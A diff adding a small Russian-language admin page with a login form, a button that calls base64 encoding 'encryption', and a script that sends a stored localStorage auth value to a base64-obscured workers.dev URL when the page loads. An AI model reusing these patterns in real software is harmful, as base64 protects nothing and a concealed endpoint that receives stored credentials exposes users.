@@ -1,0 +1,42 @@
+<head>
+    <link rel="stylesheet" href="admin.css">
+</head>
+
+<input type="text" class="encryptForm" placeholder="Текст для шифровки">
+<button class="encrypt">Зашифровать</button>
+<div class="auth">
+    <input type="text" placeholder="Логин">
+    <input type="text" placeholder="Пароль">
+    <button>Войти</button>
+</div>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const encryptForm = document.querySelector('.encryptForm')
+        const encryptButton = document.querySelector("button.encrypt")
+        
+        encryptButton.onclick = () => {
+            let text = encryptForm.value
+            encryptForm.value = btoa(text)
+        }
+    })
+
+    const authData = localStorage.getItem("auth")
+    // Если сохранилась запись об авторизации
+    if (authData) {
+        const url = atob("aHR0cHM6Ly9oYW55by13cml0ZXMub215cmF1Y3kud29ya2Vycy5kZXYvYXV0aA==")
+        fetch(url, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ authData })
+        })
+            .then(resp => resp.json())
+            .then(data => {
+                if (data.status === "OK") {
+                    document.location.href = "dashboard.html"
+                }
+            })
+    }
+</script>
